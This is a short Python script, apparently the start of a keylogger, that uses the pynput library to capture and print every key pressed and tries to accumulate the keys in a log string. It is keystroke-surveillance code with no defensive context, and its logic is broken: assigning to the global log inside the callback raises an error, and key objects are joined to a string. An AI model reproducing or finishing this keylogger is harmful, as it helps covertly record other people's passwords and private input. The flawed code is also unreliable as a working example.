#!/usr/bin/env python
import pynput.keyboard

log = ""

def process_key_press(key):
    log = log + key
    print(key)

keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
with keyboard_listener:
    keyboard_listener.join()
